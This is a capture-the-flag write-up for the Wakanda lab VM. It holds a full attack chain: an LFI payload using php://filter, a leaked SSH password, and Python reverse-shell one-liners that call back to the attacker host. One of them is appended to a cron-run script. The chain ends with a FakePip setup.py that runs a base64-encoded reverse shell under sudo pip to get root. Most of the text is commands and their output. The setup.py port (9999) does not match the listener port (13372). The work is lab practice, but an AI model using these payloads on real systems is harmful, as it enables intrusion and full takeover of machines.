Wakanda


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] LFI-Local File Inclusion with php/filter (?lang=fr)
[+] Python reverse shell
[+] Privilege Escalation abusing SUDO rights  /pip install (pip Install priv esc with FakePIP)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scanning Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.104
Host is up (0.00042s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42640/udp  status
|_  100024  1          45961/tcp  status
3333/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Scanning Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.104

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Oct 10 01:03:19 2019
URL_BASE: http://192.168.56.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.104/ ----
+ http://192.168.56.104/admin (CODE:200|SIZE:0)                                
+ http://192.168.56.104/backup (CODE:200|SIZE:0)                               
+ http://192.168.56.104/index.php (CODE:200|SIZE:1527)                         
+ http://192.168.56.104/secret (CODE:200|SIZE:0)                               
+ http://192.168.56.104/server-status (CODE:403|SIZE:302)                      
+ http://192.168.56.104/shell (CODE:200|SIZE:0)    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.104

<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">

    <title>Vibranium Market</title>


    <link href="bootstrap.css" rel="stylesheet">

    
    <link href="cover.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>

      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
          
            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
                    </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>

      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We analyse the comment : 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


This can lead to a LFI

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://192.168.56.104/?lang=php://filter/convert.base64-encode/resource=index
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We get a base 64 encoded index

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 After decoding the string we get the password for connecting to the server via SSH.
 ![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Wakanda/wakanda1.png)

Username : mamadou
Password : 
Niamey4Ever227!!!
Connecting to the server via ssh on port 3333

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh mamadou@192.168.56.104 -p 3333
mamadou@192.168.56.104's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Oct 10 01:23:36 2019 from 192.168.56.102
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are dropped into a python shell.
Creating a reverse shell in python on port 1234 that will send a connection back to kali.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After starting a listener on port 1234  and running the python payload we receive another shell.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh mamadou@192.168.56.104 -p 3333
mamadou@192.168.56.104's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Thu Oct 10 01:30:34 2019 from 192.168.56.102
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting a reverse shell


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.104] 54424
$ id
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
$ python -c 'import pty;pty.spawn("/bin/bash");'
mamadou@Wakanda1:~$ id

uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We try to find all the files owend by user devops

 find / -user devops 2>/dev/null  

 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Adding a reverse shell on port 4444 to the /srv/antivirus.py script.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ cat /srv/.antivirus.py
open('/tmp/test','w').write('test')

$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /srv/.antivirus.py
$ cat /srv/.antivirus.py
open('/tmp/test','w').write('test')
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);






~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
 After 5 minutes the scripts automatically executes and we have a reverse shell, with the user devops.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.104] 59052
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(devops) gid=1002(developer) groups=1002(developer)
$ whoami
devops
$ python -c 'import pty;pty.spawn("/bin/bash");'
devops@Wakanda1:/$ cd ~    
cd ~
devops@Wakanda1:~$ cat flag2.txt
cat flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
devops@Wakanda1:~$ 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Privilege escalation
 devops user has SUDO rights for /usr/bin/pip
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
devops@Wakanda1:~$ sudo -l
sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


There is a fake pip online available at https://github.com/0x00-0x00/FakePip.git designed to be used in privilege escalation.
After downloading the git, we modify the payload in setup.py


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

root@setrus:/FakePip# cat setup.py 
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '192.168.56.102'  # change this
    LPORT = 9999
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Downloading the setup.py from Kali linux machine.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
devops@Wakanda1:/tmp/FakePip$ wget http://192.168.56.102:8899/setup.py
wget http://192.168.56.102:8899/setup.py
--2019-10-10 03:17:06--  http://192.168.56.102:8899/setup.py
Connecting to 192.168.56.102:8899... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1346 (1.3K) [text/plain]
Saving to: ‘setup.py’

setup.py            100%[=====================>]   1.31K  --.-KB/s   in 0s     

2019-10-10 03:17:06 (115 MB/s) - ‘setup.py’ saved [1346/1346]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Privilge escalation with python pip


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
devops@Wakanda1:/tmp/FakePip$ sudo pip install . --upgrade --force-reinstall
sudo pip install . --upgrade --force-reinstall
Unpacking /tmp/FakePip
  Running setup.py (path:/tmp/pip-gCkf3w-build/setup.py) egg_info for package from file:///tmp/FakePip
    
Installing collected packages: FakePip
  Running setup.py install for FakePip
    


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


On the listern on port 13372 in kali we get a reverse shell with root privileges:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 13372
listening on [any] 13372 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.104] 39312
root@Wakanda1:/tmp/pip-gCkf3w-build# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Wakanda1:/tmp/pip-gCkf3w-build# whoami
whoami
root
root@Wakanda1:/tmp/pip-gCkf3w-build# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 







